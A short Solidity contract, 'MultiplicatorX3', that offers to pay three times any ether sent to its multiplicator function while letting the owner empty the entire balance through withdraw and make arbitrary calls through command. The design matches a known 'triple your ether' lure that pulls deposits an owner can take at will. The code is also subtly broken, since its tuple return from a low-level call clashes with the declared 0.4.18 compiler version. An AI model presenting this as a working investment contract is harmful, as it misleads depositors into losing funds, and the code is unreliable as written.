pragma solidity ^0.4.18;

contract MultiplicatorX3 {
    address public owner = msg.sender;

    function() public payable {}

    function withdraw() public {
        require(msg.sender == owner);
        owner.transfer(this.balance);
    }

    function command(address adr, bytes data) public payable {
        require(msg.sender == owner);

        bool success;
        bytes memory returnData;
        (success, returnData) = adr.call.value(msg.value)(data);
        require(success);
    }

    function multiplicator(address adr) public payable {
        require(msg.value > 0);
        uint256 newValue = msg.value * 3;
        require(newValue > msg.value);
        if(this.balance >= newValue) {
            adr.transfer(newValue);
        }
    }
}